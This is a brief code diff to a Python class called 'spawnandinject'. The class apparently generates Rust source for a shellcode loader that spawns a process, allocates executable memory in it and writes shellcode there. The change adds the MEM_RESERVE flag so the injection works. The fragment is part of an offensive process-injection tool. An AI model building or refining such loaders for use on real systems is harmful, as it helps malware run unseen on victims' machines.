@@ -4,6 +4,7 @@ class spawnandinject:
         return ['extern crate windows_sys;', 
                 'use windows_sys::Win32::System::Memory::VirtualAllocEx;',
                 'use windows_sys::Win32::System::Memory::MEM_COMMIT;',
+                'use windows_sys::Win32::System::Memory::MEM_RESERVE;',
                 'use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;',
                 'use windows_sys::Win32::System::Threading::CreateProcessA;',
                 'use windows_sys::Win32::System::Threading::STARTUPINFOA;',
@@ -63,7 +64,7 @@ fn main() {{
             (lpprocessinformation).hProcess, 
             std::ptr::null(), 
             shellcode.len() as usize, 
-            MEM_COMMIT, 
+            MEM_COMMIT | MEM_RESERVE, 
             PAGE_EXECUTE_READ);
 
         let _ = WriteProcessMemory(
